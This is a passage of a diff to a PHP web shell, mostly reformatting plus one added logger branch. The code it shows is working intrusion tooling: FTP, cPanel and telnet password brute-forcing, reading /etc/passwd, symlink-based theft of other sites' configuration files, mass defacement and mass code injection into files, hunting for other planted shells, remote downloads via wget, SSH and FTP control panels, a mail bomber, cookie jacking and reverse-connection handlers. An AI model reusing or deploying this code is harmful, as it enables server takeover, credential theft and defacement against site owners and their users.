             $userlist = explode("\n", $_POST['username']);
             $passlist = explode("\n", $_POST['password']);
-            if ($_POST['cracktype'] == "ftp") {
-                foreach ($userlist as $user) {
+            if($_POST['cracktype'] == "ftp") {
+                foreach($userlist as $user) {
                     $pureuser = trim($user);
-                    foreach ($passlist as $password) {
+                    foreach($passlist as $password) {
                         $purepass = trim($password);
                         ftp_check($_POST['target'], $pureuser, $purepass, $connect_timeout);
                     }
                 }
             }
-            if ($_POST['cracktype'] == "cpanel" || $_POST['cracktype'] == "telnet") {
-                if ($cracktype == "telnet") {
+            if($_POST['cracktype'] == "cpanel" || $_POST['cracktype'] == "telnet") {
+                if($cracktype == "telnet") {
                     $cpanel_port = "23";
                 } else
                     $cpanel_port = "2082";
-                foreach ($userlist as $user) {
+                foreach($userlist as $user) {
                     $pureuser = trim($user);
                     echo "<b><font face=Iceland style=\"font-size:
 9pt\" color=#008000> [ - ] </font><font face=Iceland
 style=\"font-size: 9pt\" color=#FF0800>
 						Processing user $pureuser
 ...</font></b><br><br>";
-                    foreach ($passlist as $password) {
+                    foreach($passlist as $password) {
                         $purepass = trim($password);
                         cpanel_check($_POST['target'], $pureuser, $purepass, $connect_timeout);
                     }
@@ -1805,13 +1793,13 @@ style=\"font-size: 9pt\" color=#FF0800>
 function get_users() {
     $userz = array();
     $user  = file("/etc/passwd");
-    foreach ($user as $userx => $usersz) {
+    foreach($user as $userx => $usersz) {
         $userct = explode(":", $usersz);
         array_push($userz, $userct[0]);
     }
-    if (!$user) {
-        if ($opd = opendir("/home/")) {
-            while (($file = readdir($opd)) !== false) {
+    if(!$user) {
+        if($opd = opendir("/home/")) {
+            while(($file = readdir($opd)) !== false) {
                 array_push($userz, $file);
             }
         }
@@ -1839,13 +1827,13 @@ color=7171C6>" . php_uname(v) . "</font></td></td>
 color=7171C6>" . php_uname(m) . "</font></td</tr>
     <tr><td>Server Software : <font
 color=7171C6>" . $_SERVER['SERVER_SOFTWARE'] . "</font></td</tr><tr>";
-    if (function_exists('apache_get_modules')) {
+    if(function_exists('apache_get_modules')) {
         echo "<tr><td style='text-align:left;'>Loaded Apache
 modules : <br /><br /><font color=7171C6>";
         echo implode(', ', apache_get_modules());
         echo "</font></tr></td>";
     }
-    if ($os == 'win') {
+    if($os == 'win') {
         echo "<tr><td style='text-align:left;'>Account
 Setting : <font color=7171C6><pre>" . cmd('net
 accounts') . "</pre></td></tr>
@@ -1854,7 +1842,7 @@ accounts') . "</pre></td></tr>
 user') . "</pre></td></tr>
                ";
     }
-    if ($os == 'nix') {
+    if($os == 'nix') {
         echo "<tr><td style='text-align:left'>Distro :
 <font color=7171C6><pre>" . cmd('cat
 /etc/*-release') . "</pre></font></td></tr>
@@ -1907,8 +1895,8 @@ color=7171C6><pre>" . cmd('ulimit
             'suidperl'
         );
         $uze    = array();
-        foreach ($useful as $uzeful) {
-            if (cmd("which $uzeful")) {
+        foreach($useful as $uzeful) {
+            if(cmd("which $uzeful")) {
                 $uze[] = $uzeful;
             }
         }
@@ -1927,8 +1915,8 @@ style='text-align:left'>Useful
             'lwp-mirror'
         );
         $uze         = array();
-        foreach ($downloaders as $downloader) {
-            if (cmd("which $downloader")) {
+        foreach($downloaders as $downloader) {
+            if(cmd("which $downloader")) {
                 $uze[] = $downloader;
             }
         }
@@ -1981,9 +1969,9 @@ class=tbl>";
     $uri_in = $_POST['tryzzz'];
     $r_xuri = trim($uri_in);
     $r_xuri = explode("\n", $r_xuri);
-    foreach ($r_xuri as $rty) {
+    foreach($r_xuri as $rty) {
         $urlzzx = $webz . $rty;
-        if (function_exists('curl_init')) {
+        if(function_exists('curl_init')) {
             echo "<tr><td
 style='text-align:left'><font
 color=orange>Checking : </font> <font color=7171C6> $urlzzx
@@ -1993,7 +1981,7 @@ color=orange>Checking : </font> <font color=7171C6> $urlzzx
             curl_exec($ch);
             $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
             curl_close($ch);
-            if ($status_code == 200) {
+            if($status_code == 200) {
                 echo "<td style='text-align:left'><font
 color=yellow> Found....</font></td></tr>";
             } else {
@@ -2026,9 +2014,9 @@ function remote_download_bg() {
     $rt_ffile = $_GET['rurlfile'];
     $name     = basename($rt_ffile);
     echo "<div id=result>";
-    switch ($opt) {
+    switch($opt) {
         case "WGET":
-            if ($os != 'win') {
+            if($os != 'win') {
                 cmd("wget $rt_ffile");
                 alert("Downloaded Successfully...");
             } else {
@@ -2036,7 +2024,7 @@ function remote_download_bg() {
             }
             break;
         case "cURL":
-            if (function_exists('curl_init')) {
+            if(function_exists('curl_init')) {
                 $ch = curl_init($rt_ffile);
                 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                 $data = curl_exec($ch);
@@ -2051,10 +2039,10 @@ function remote_download_bg() {
     echo "</div>";
 }
 function hex_encode_ui() {
-    if (isset($_REQUEST['hexinp']) && isset($_REQUEST['tyxxx'])) {
+    if(isset($_REQUEST['hexinp']) && isset($_REQUEST['tyxxx'])) {
         $tyx      = $_POST['tyxxx'];
         $rezultzz = $_POST['hexinp'];
-        switch ($tyx) {
+        switch($tyx) {
             case "Encode":
                 $rzul = PREG_REPLACE("'(.)'e", "dechex(ord('\\1'))", $rezultzz);
                 echo "<div
@@ -2122,11 +2110,11 @@ id=result><center><h2>Result</h2></center><hr
     $ftp_list = $_GET['ftp_anonz'];
     $xftpl    = trim($ftp_list);
     $xftpl    = explode("\n", $xftpl);
-    foreach ($xftpl as $xftp) {
+    foreach($xftpl as $xftp) {
         $xftp     = str_replace("ftp://", "", $xftp);
         $conn_ftp = ftp_connect($xftp);
         $success  = ftp_login($conn_ftp, "anonymous", "");
-        if ($success) {
+        if($success) {
             echo "<tr><td><font
 color=7171C6>$xftp</font></td><td><font
 color=yellow>Successfull</font></td></tr>";
@@ -2158,18 +2146,18 @@ function mass_deface_bg() {
     chdir($d_path);
     $d_file   = $_GET['mass_name'];
     $d_conten = $_GET['mass_cont'];
-    if (is_dir($d_path)) {
+    if(is_dir($d_path)) {
         chdir($d_path);
         $d_dirs = array();
-        if ($handle = opendir($d_path)) {
-            while (($item = readdir($handle)) !== FALSE) {
-                if ($item == ".") {
+        if($handle = opendir($d_path)) {
+            while(($item = readdir($handle)) !== FALSE) {
+                if($item == ".") {
                     continue;
                 }
-                if ($item == "..") {
+                if($item == "..") {
                     continue;
                 }
-                if (is_dir($item)) {
+                if(is_dir($item)) {
                     array_push($d_dirs, $item);
                 }
             }
@@ -2178,11 +2166,11 @@ function mass_deface_bg() {
     echo "<div
 id=result><center><h2>Result</h2></center><hr
 /><br /><br /><table class=tbl>";
-    foreach ($d_dirs as $d_dir) {
+    foreach($d_dirs as $d_dir) {
         $xd_path = getcwd() . "$sep$d_dir$sep$d_file";
-        if (is_writable($d_dir)) {
+        if(is_writable($d_dir)) {
             $handle = fopen($xd_path, "wb");
-            if ($handle) {
+            if($handle) {
                 fwrite($handle, $d_conten);
             }
         }
@@ -2265,7 +2253,7 @@ function config_grabber_bg() {
     $php_ini_x = fopen('Cvar1984/php.ini', 'wb');
     fwrite($php_ini_x, $sym_php_ini);
     $usr = explode("\n", $_POST['user_z_list']);
-    foreach ($usr as $uzer) {
+    foreach($usr as $uzer) {
         $u_er = trim($uzer);
         symlinggg($u_er);
     }
@@ -2273,18 +2261,18 @@ function config_grabber_bg() {
 '_blank');</script>";
     alert('Config Grab compted. Check configs in direcory Cvar1984');
 }
-if (isset($_POST['user_z_list'])) {
+if(isset($_POST['user_z_list'])) {
     config_grabber_bg();
 }
 function config_grabber_ui() {
-    if (file('/etc/passwd')) {
+    if(file('/etc/passwd')) {
 ?><script>alert("/etc/named.conf Not Found, Its
 alternative method.");</script><div
 id=result><center><h2>Config Grabber</h2><hr><br><br><table class=tbl><form
 method=POST><tr><td><textarea spellcheck=false
 class='textarea_edit' rows=15 cols=60  name=user_z_list><?php
         $users = file('/etc/passwd');
-        foreach ($users as $user) {
+        foreach($users as $user) {
             $user = explode(':', $user);
             echo $user[0] . "\n";
         }
@@ -2337,15 +2325,15 @@ function sym_xxx() {
     $php_ini_x = fopen('Cvar1984/php.ini', 'w');
     fwrite($php_ini_x, $sym_php_ini);
     $akps = implode(file("/etc/named.conf"));
-    if (!$akps) {
+    if(!$akps) {
         config_grabber_ui();
     } else {
         $usrd = array();
-        foreach ($akps as $akp) {
-            if (eregi("zone", $akp)) {
+        foreach($akps as $akp) {
+            if(eregi("zone", $akp)) {
                 preg_match_all('#zone "(.*)" #', $akp, $akpzz);
                 flush();
-                if (strlen(trim($akpzz[1][0])) > 2) {
+                if(strlen(trim($akpzz[1][0])) > 2) {
                     $user = posix_getpwuid(@fileowner("/etc/valiases/" . $akpzz[1][0]));
                     symlinkg($akpzz[1][0], $user['name']);
                     flush();
@@ -2365,7 +2353,7 @@ function sym_link() {
     $php_ini_x = fopen('CVAR/php.ini', 'w');
     fwrite($php_ini_x, $sym_php_ini);
     symlink("/", "CVAR/root");
-    if (!$file) {
+    if(!$file) {
         echo "<script>alert('Bind File /etc/passwd Not Found.
 Its alternative Method')</script>";
         echo "<div
@@ -2373,7 +2361,7 @@ id=result><center><h2>SymLink</h2></center><hr
 /><br /><br /><table
 class='table'><tr><th>Users</th><th>Exploit</th></tr>";
         $users = file('/etc/passwd');
-        foreach ($users as $user) {
+        foreach($users as $user) {
             $user = explode(':', $user);
             echo "<tr><td>" . $user[0] . "</td><td><a
 href='CVAR/root/home/" . $user[0] . "/public_html/'
@@ -2383,11 +2371,11 @@ target=_blank>SymLink</tr>";
     } else {
         echo "<table
 class=table><tr><td>Domains</td><td>Users</td><td>Exploit</font></td></tr>";
-        foreach ($akps as $akp) {
-            if (eregi("zone", $akp)) {
+        foreach($akps as $akp) {
+            if(eregi("zone", $akp)) {
                 preg_match_all('#zone "(.*)" #', $akp, $akpzz);
                 flush();
-                if (strlen(trim($akpzz[1][0])) > 2) {
+                if(strlen(trim($akpzz[1][0])) > 2) {
                     $user = posix_getpwuid(@fileowner("/etc/valiases/" . $akpzz[1][0]));
                     echo "<tr><td><a
 href=http://www." . $akpzz[1][0] . "
@@ -2461,9 +2449,9 @@ class='table'>";
         "m1n1.php",
         "b374km1n1.php"
     );
-    foreach ($ShellZ as $shell) {
+    foreach($ShellZ as $shell) {
         $urlzzx = $sh_url . $shell;
-        if (function_exists('curl_init')) {
+        if(function_exists('curl_init')) {
             echo "<tr><td
 style='text-align:left'><font
 color=orange>Checking : </font> <font color=7171C6> $urlzzx
@@ -2473,7 +2461,7 @@ color=orange>Checking : </font> <font color=7171C6> $urlzzx
             curl_exec($ch);
             $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
             curl_close($ch);
-            if ($status_code == 200) {
+            if($status_code == 200) {
                 echo "<td style='text-align:left'><font
 color=yellow>Found</font></td></tr>";
             } else {
@@ -2493,9 +2481,9 @@ function code_in_ui() {
     $ftype  = $_POST['ffttype'];
     $c_cont = $_POST['code_cont'];
     $ppp    = $_POST['path'];
-    if (isset($_POST['modexxx']) && isset($_POST['path']) && isset($_POST['ffttype']) && isset($_POST['code_cont']) && $mode != "" && $ftype != "" && $c_cont != "" && $ppp != "") {
+    if(isset($_POST['modexxx']) && isset($_POST['path']) && isset($_POST['ffttype']) && isset($_POST['code_cont']) && $mode != "" && $ftype != "" && $c_cont != "" && $ppp != "") {
         echo "<div id=result><center><h2>Mass Rewrite Successfully</h2></center><table class=tbl>";
-        switch ($mode) {
+        switch($mode) {
             case "Apender":
                 $mmode = "a";
                 break;
@@ -2503,13 +2491,13 @@ function code_in_ui() {
                 $mmode = "w";
                 break;
         }
-        if ($handle = opendir($ppp)) {
-            while (($c_file = readdir($handle)) !== False) {
-                if ((preg_match("/$ftype" . '$' . '/', $c_file, $matches) != 0) && (preg_match('/' . $c_file . '$/', $self, $matches) != 1)) {
+        if($handle = opendir($ppp)) {
+            while(($c_file = readdir($handle)) !== False) {
+                if((preg_match("/$ftype" . '$' . '/', $c_file, $matches) != 0) && (preg_match('/' . $c_file . '$/', $self, $matches) != 1)) {
                     echo "<tr><td><font
 color=red>$ppp$sep$c_file</font></td></tr>";
                     $fd = fopen($ppp . $sep . $c_file, $mmode);
-                    if ($fd) {
+                    if($fd) {
                         fwrite($fd, $c_cont);
                     } else {
                         alert("Error. Access Denied");
@@ -2553,23 +2541,23 @@ function ssh_man_bg() {
     $ssh_h = $_GET['ssh_host'];
     $ssh_u = $_GET['ssh_user'];
     $ssh_p = $_GET['ssh_pass'];
-    if (!function_exists('ssh2_connect')) {
+    if(!function_exists('ssh2_connect')) {
         alert("Sorry, Function ssh2_connect is not found");
     }
     $conn = ssh2_connect($ssh_h, 22);
-    if (!$conn) {
+    if(!$conn) {
         alert("SSH Host Not Found");
     }
     $log = ssh2_auth_password($conn, $ssh_u, $ssh_p);
-    if (!$log) {
+    if(!$log) {
         alert("SSH Authorication failed");
     }
     $shell = ssh2_shell($conn, "bash");
-    if ($_GET['ssh_cmd'] != "" && $_GET['ssh_cmd']) {
+    if($_GET['ssh_cmd'] != "" && $_GET['ssh_cmd']) {
         $ssh_cmd = $_GET['ssh_cmd'];
         fwrite($shell, $ssh_cmd);
         sleep(1);
-        while ($line = fgets($shell)) {
+        while($line = fgets($shell)) {
             flush();
             echo $line . "\n";
         }
@@ -2624,28 +2612,28 @@ function ftp_man_bg() {
     $fpath = $_GET['fpath'];
     $upl   = $_GET['upload_file'];
     $down  = $_GET['download_file'];
-    if ($fpath == "") {
+    if($fpath == "") {
         $fpath = ftp_pwd($conn);
     }
     $conn = ftp_connect($fhost);
-    if (!$conn) {
+    if(!$conn) {
         alert("FTP Host Not Found!!!");
     }
     $log = ftp_login($conn, $fuser, $fpass);
-    if (!$log) {
+    if(!$log) {
         alert("FTP Authorication Failed");
     }
-    if ($upl != "") {
+    if($upl != "") {
         $fp = fopen($upl, 'r');
-        if (ftp_fput($conn, $upl, $fp, FTP_ASCII)) {
+        if(ftp_fput($conn, $upl, $fp, FTP_ASCII)) {
             echo "<center><font color=yellow>Successfully uploaded <font color=red> $upl </font> </font></center>";
         } else {
             echo "<center><font color=red>There was a problem while uploading <font color=yellow> $upl </font></font></center>";
         }
     }
-    if ($down != "") {
+    if($down != "") {
         $handle = fopen($down, 'w');
-        if (ftp_fget($conn, $handle, $down, FTP_ASCII, 0)) {
+        if(ftp_fget($conn, $handle, $down, FTP_ASCII, 0)) {
             echo "<center><font color=yellow>successfully written to <font color=red> $down </font></font></center>";
         } else {
             echo "<center><font color=red>There was a problem while downloading <font color=yellow> $down </font> to <font color=yellow> $down </font></font></center>";
@@ -2654,156 +2642,158 @@ function ftp_man_bg() {
     echo "<table class='table'><tr><th>Files</th>";
     ftp_chdir($fpath);
     $list = ftp_rawlist($conn, $fpath);
-    foreach ($list as $fff) {
+    foreach($list as $fff) {
         echo "<tr><td><pre>$fff</pre></td></tr>";
     }
     echo "</table></div>";
 }
 // Frond End Calls //
-if (isset($_POST['e_file']) && isset($_POST['e_content_n'])) {
+if(isset($_POST['e_file']) && isset($_POST['e_content_n'])) {
     edit_file_bg();
-} else if (isset($_REQUEST['musik'])) {
+} else if(isset($_REQUEST['musik'])) {
     soundcloud();
-} else if (isset($_REQUEST['ganteng'])) {
+} else if(isset($_REQUEST['logger'])) {
+	 ceklog();
+} else if(isset($_REQUEST['ganteng'])) {
     gantengware();
-} else if (isset($_REQUEST['phpinfo'])) {
+} else if(isset($_REQUEST['phpinfo'])) {
     phpinfo();
-} else if (isset($_REQUEST['rctm'])) {
+} else if(isset($_REQUEST['rctm'])) {
     rctm();
-} else if (isset($_REQUEST['idx'])) {
+} else if(isset($_REQUEST['idx'])) {
     idxshell();
-} else if (isset($_REQUEST['xaishell'])) {
+} else if(isset($_REQUEST['xaishell'])) {
     xaishell();
-} else if (isset($_REQUSET['ngindex'])) {
+} else if(isset($_REQUSET['ngindex'])) {
     ngindex();
-} else if (isset($_REQUEST['jembud2'])) {
+} else if(isset($_REQUEST['jembud2'])) {
     jembud2();
-} else if (isset($_REQUEST['cgi'])) {
+} else if(isset($_REQUEST['cgi'])) {
     cgi();
-} else if (isset($_REQUEST['adminer'])) {
+} else if(isset($_REQUEST['adminer'])) {
     adminer();
-} else if (isset($_REQUEST['sh311_scanner'])) {
+} else if(isset($_REQUEST['sh311_scanner'])) {
     shell_finder_ui();
-} else if (isset($_REQUEST['ftp_host']) && isset($_REQUEST['ftp_user']) && isset($_REQUEST['ftp_pass'])) {
+} else if(isset($_REQUEST['ftp_host']) && isset($_REQUEST['ftp_user']) && isset($_REQUEST['ftp_pass'])) {
     ftp_man_bg();
-} else if (isset($_REQUEST['ftpman'])) {
+} else if(isset($_REQUEST['ftpman'])) {
     ftp_man_ui();
-} else if (isset($_GET['ssh_host']) && isset($_GET['ssh_user']) && isset($_GET['ssh_pass'])) {
+} else if(isset($_GET['ssh_host']) && isset($_GET['ssh_user']) && isset($_GET['ssh_pass'])) {
     ssh_man_bg();
-} else if (isset($_REQUEST['sshman'])) {
+} else if(isset($_REQUEST['sshman'])) {
     ssh_man_ui();
-} else if (isset($_REQUEST['c0de_inject']) && isset($_REQUEST['path'])) {
+} else if(isset($_REQUEST['c0de_inject']) && isset($_REQUEST['path'])) {
     chdir($_GET['path']);
     code_in_ui();
-} else if (isset($_GET['sh311_scanx'])) {
+} else if(isset($_GET['sh311_scanx'])) {
     shell_finder_bg();
-} else if (isset($_REQUEST['config_grab'])) {
+} else if(isset($_REQUEST['config_grab'])) {
     sym_xxx();
-} else if (isset($_REQUEST['ftp_man'])) {
+} else if(isset($_REQUEST['ftp_man'])) {
     ftp_man_ui();
-} else if (isset($_REQUEST['mass_xploit'])) {
+} else if(isset($_REQUEST['mass_xploit'])) {
     mass_deface_ui();
-} else if (isset($_GET['f_host']) && isset($_GET['f_user']) && isset($_GET['f_pass'])) {
+} else if(isset($_GET['f_host']) && isset($_GET['f_user']) && isset($_GET['f_pass'])) {
     ftp_man_bg();
-} else if (isset($_GET['mass_name']) && isset($_GET['mass_cont'])) {
+} else if(isset($_GET['mass_name']) && isset($_GET['mass_cont'])) {
     mass_deface_bg();
-} else if (isset($_REQUEST['ftp_anon_scan'])) {
+} else if(isset($_REQUEST['ftp_anon_scan'])) {
     ftp_anonymous_ui();
-} else if (isset($_GET['ftp_anonz'])) {
+} else if(isset($_GET['ftp_anonz'])) {
     ftp_anonymous_bg();
-} else if (isset($_REQUEST['killme'])) {
+} else if(isset($_REQUEST['killme'])) {
     killme();
-} else if (isset($_REQUEST['hexenc'])) {
+} else if(isset($_REQUEST['hexenc'])) {
     hex_encode_ui();
-} else if (isset($_REQUEST['remotefiledown'])) {
+} else if(isset($_REQUEST['remotefiledown'])) {
     remote_download_ui();
-} else if (isset($_GET['type_r_down']) && isset($_GET['rurlfile']) && isset($_GET['path'])) {
+} else if(isset($_GET['type_r_down']) && isset($_GET['rurlfile']) && isset($_GET['path'])) {
     remote_download_bg();
-} else if (isset($_REQUEST['cpanel_crack'])) {
+} else if(isset($_REQUEST['cpanel_crack'])) {
     cpanel_crack();
-} else if (isset($_REQUEST['rem_web']) && isset($_REQUEST['tryzzz'])) {
+} else if(isset($_REQUEST['rem_web']) && isset($_REQUEST['tryzzz'])) {
     remote_file_check_bg();
-} else if (isset($_REQUEST['typed']) && isset($_REQUEST['typenc']) && isset($_REQUEST['php_content'])) {
+} else if(isset($_REQUEST['typed']) && isset($_REQUEST['typenc']) && isset($_REQUEST['php_content'])) {
     php_ende_bg();
-} else if (isset($_REQUEST['remote_server_scan'])) {
+} else if(isset($_REQUEST['remote_server_scan'])) {
     remote_file_check_ui();
-} else if (isset($_REQUEST['server_exploit_details'])) {
+} else if(isset($_REQUEST['server_exploit_details'])) {
     exploit_details();
-} else if (isset($_REQUEST['from']) && isset($_REQUEST['to_mail']) && isset($_REQUEST['subject_mail']) && isset($_REQUEST['mail_content'])) {
+} else if(isset($_REQUEST['from']) && isset($_REQUEST['to_mail']) && isset($_REQUEST['subject_mail']) && isset($_REQUEST['mail_content'])) {
     massmailer_bg();
-} else if (isset($_REQUEST['mysqlman'])) {
+} else if(isset($_REQUEST['mysqlman'])) {
     mysqlman();
-} else if (isset($_REQUEST['bomb_to']) && isset($_REQUEST['bomb_subject']) && isset($_REQUEST['bmail_content'])) {
+} else if(isset($_REQUEST['bomb_to']) && isset($_REQUEST['bomb_subject']) && isset($_REQUEST['bmail_content'])) {
     mailbomb_bg();
-} else if (isset($_REQUEST['cookiejack'])) {
+} else if(isset($_REQUEST['cookiejack'])) {
     cookie_jack();
-} else if (isset($_REQUEST['massmailer'])) {
+} else if(isset($_REQUEST['massmailer'])) {
     massmailer_ui();
-} else if (isset($_REQUEST['rename'])) {
+} else if(isset($_REQUEST['rename'])) {
     chdir($_GET['path']);
     rename_ui();
-} else if (isset($_GET['old_name']) && isset($_GET['new_name'])) {
+} else if(isset($_GET['old_name']) && isset($_GET['new_name'])) {
     chdir($_GET['path']);
     rename_bg();
-} else if (isset($_REQUEST['encodefile'])) {
+} else if(isset($_REQUEST['encodefile'])) {
     php_ende_ui();
-} else if (isset($_REQUEST['edit'])) {
+} else if(isset($_REQUEST['edit'])) {
     edit_file();
-} else if (isset($_REQUEST['down']) && isset($_REQUEST['path'])) {
+} else if(isset($_REQUEST['down']) && isset($_REQUEST['path'])) {
     download();
-} else if (isset($_REQUEST['gzip']) && isset($_REQUEST['path'])) {
+} else if(isset($_REQUEST['gzip']) && isset($_REQUEST['path'])) {
     download_gzip();
-} else if (isset($_REQUEST['read'])) {
+} else if(isset($_REQUEST['read'])) {
     chdir($_GET['path']);
     code_viewer();
-} else if (isset($_REQUEST['perm'])) {
+} else if(isset($_REQUEST['perm'])) {
     chdir($_GET['path']);
     ch_perm_ui();
-} else if (isset($_GET['path']) && isset($_GET['p_filex']) && isset($_GET['new_perm'])) {
+} else if(isset($_GET['path']) && isset($_GET['p_filex']) && isset($_GET['new_perm'])) {
     chdir($_GET['path']);
     ch_perm_bg();
-} else if (isset($_REQUEST['del_fil'])) {
+} else if(isset($_REQUEST['del_fil'])) {
     chdir($_GET['path']);
     delete_file();
     exit;
-} else if (isset($_REQUEST['phpinfo'])) {
+} else if(isset($_REQUEST['phpinfo'])) {
     chdir($_GET['path']);
     ob_clean();
     echo phpinfo();
     exit;
-} else if (isset($_REQUEST['del_dir'])) {
+} else if(isset($_REQUEST['del_dir'])) {
     chdir($_GET['path']);
     $d_dir = $_GET['del_dir'];
     deldirs($d_dir);
-} else if (isset($_GET['path']) && isset($_GET['new_file'])) {
+} else if(isset($_GET['path']) && isset($_GET['new_file'])) {
     chdir($_GET['path']);
     mk_file_ui();
-} else if (isset($_GET['path']) && isset($_GET['new_f_name']) && isset($_GET['n_file_content'])) {
+} else if(isset($_GET['path']) && isset($_GET['new_f_name']) && isset($_GET['n_file_content'])) {
     mk_file_bg();
-} else if (isset($_GET['path']) && isset($_GET['new_dir'])) {
+} else if(isset($_GET['path']) && isset($_GET['new_dir'])) {
     chdir($_GET['path']);
     create_dir();
-} else if (isset($_GET['path']) && isset($_GET['cmdexe'])) {
+} else if(isset($_GET['path']) && isset($_GET['cmdexe'])) {
     chdir($_GET['path']);
     cmd();
-} else if (isset($_POST['upload_f']) && isset($_POST['path'])) {
+} else if(isset($_POST['upload_f']) && isset($_POST['path'])) {
     upload_file();
-} else if (isset($_REQUEST['rs'])) {
+} else if(isset($_REQUEST['rs'])) {
     reverse_conn_ui();
-} else if (isset($_GET['rev_option']) && isset($_GET['my_ip']) && isset($_GET['my_port'])) {
+} else if(isset($_GET['rev_option']) && isset($_GET['my_ip']) && isset($_GET['my_port'])) {
     reverse_conn_bg();
-} else if (isset($_REQUEST['safe_mod']) && isset($_REQUEST['path'])) {
+} else if(isset($_REQUEST['safe_mod']) && isset($_REQUEST['path'])) {
     chdir($_GET['path']);
     safe_mode_fuck_ui();
-} else if (isset($_GET['path']) && isset($_GET['safe_mode'])) {
+} else if(isset($_GET['path']) && isset($_GET['safe_mode'])) {
     safe_mode_fuck();
-} else if (isset($_GET['path']) && isset($_REQUEST['forbd_dir'])) {
+} else if(isset($_GET['path']) && isset($_REQUEST['forbd_dir'])) {
     AccessDenied();
-} else if (isset($_REQUEST['symlink'])) {
+} else if(isset($_REQUEST['symlink'])) {
     sym_link();
-} else if (isset($_GET['path']) && isset($_GET['copy'])) {
+} else if(isset($_GET['path']) && isset($_GET['copy'])) {
     copy_file_ui();
-} else if (isset($_GET['c_file']) && isset($_GET['c_target']) && isset($_GET['cn_name'])) {
+} else if(isset($_GET['c_file']) && isset($_GET['c_target']) && isset($_GET['cn_name'])) {
     copy_file_bg();
 } else {
     filemanager_bg();
